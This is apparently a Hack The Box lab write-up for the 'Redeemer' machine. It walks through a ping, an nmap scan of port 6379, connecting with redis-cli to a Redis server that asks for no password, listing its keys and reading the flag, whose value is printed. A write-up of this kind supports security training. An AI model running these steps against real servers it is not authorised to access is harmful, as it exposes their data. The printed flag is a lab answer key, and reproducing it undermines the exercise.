# 🚀 Hack The Box - Redeemer Write-up

### **Machine Information**
| Machine Name | Target IP | Difficulty | Focus Service | Status |
| :--- | :--- | :--- | :--- | :--- |
| **Redeemer** | `10.129.174.87` | Very Easy | Redis (NoSQL Database) | **SOLVED** ✅ |

<img width="879" height="584" alt="Screenshot 2026-05-07 213151" src="https://github.com/user-attachments/assets/978dea7e-ef8c-4e6f-9c2e-7f3180be6cdd" />

---

## 📝 Exploitation Summary
This lab demonstrates the high security risks associated with **Misconfiguration** in a Redis database service. The target service was found running publicly without password authentication (*Anonymous Access*), allowing an attacker to connect, enumerate internal databases, and extract sensitive information directly through the command line.

---

## 🛠️ Step-by-Step Walkthrough

### 1. Connection Testing (Reconnaissance)
The initial step is to verify that the target host is reachable from the Kali Linux attack machine through the HTB VPN network.
```bash
ping -c 4 10.129.174.87
```
<img width="615" height="198" alt="Screenshot 2026-05-07 212923" src="https://github.com/user-attachments/assets/8d12e567-0cbb-456d-ab56-618e4b60f3cd" />

### 2. Port Scanning (Nmap Reconnaissance)
Performing a targeted port scan to discover active services and their exact version numbers.

```bash
sudo nmap -Pn -p 6379 -sSV -T4 -v 10.129.174.87
Result: Port 6379/tcp is open, running Redis key-value store 5.0.7.
```
<img width="926" height="241" alt="Screenshot 2026-05-07 212937" src="https://github.com/user-attachments/assets/a2d359da-36a3-4749-9346-3b268d9fa86c" />
<img width="911" height="473" alt="Screenshot 2026-05-07 212952" src="https://github.com/user-attachments/assets/11a436f0-3a7b-44c3-b70d-de4b54717af5" />

### 3. Tool Installation & Service Connection
Since the target uses Redis, we need the redis-tools utility package on Kali Linux to communicate with the server.

# Installing the required tool on Kali Linux
```bash
sudo apt install redis-tools -y
```

# Attempting connection to the target Redis server
```bash
redis-cli -h 10.129.174.87
Status: Successfully gained an interactive Redis shell without being prompted for a password.
```
<img width="307" height="65" alt="Screenshot 2026-05-07 213011" src="https://github.com/user-attachments/assets/b54de141-ecd5-4e73-bf99-35653136efd8" />

### 4. Database Enumeration & Looting (Data Extraction)
Inside the interactive Redis CLI, I performed basic enumeration commands to find the flag.

# 1. Checking general server statistics and database info
```bash
10.129.174.87:6379> info
```
<img width="422" height="468" alt="Screenshot 2026-05-07 213026" src="https://github.com/user-attachments/assets/5604a733-b86a-4bda-8708-230d758884e9" />
<img width="334" height="60" alt="Screenshot 2026-05-07 213106" src="https://github.com/user-attachments/assets/87563f08-0f57-42e6-a713-26d4adcaeaf6" />

# 2 . Listing all keys within the selected database
```bash
10.129.174.87:6379> keys *
# 1) "numb"
# 2) "temp"
# 3) "flag"
# 4) "stor"
```
# 3. Extracting the value of the key named 'flag'
```bash
10.129.174.87:6379> get flag
Flag Found: 03e1d2b376c37ab3f5319922053953eb
```
<img width="390" height="118" alt="Screenshot 2026-05-07 213124" src="https://github.com/user-attachments/assets/410a86b1-cb2a-475a-85b6-9aac80691dc5" />


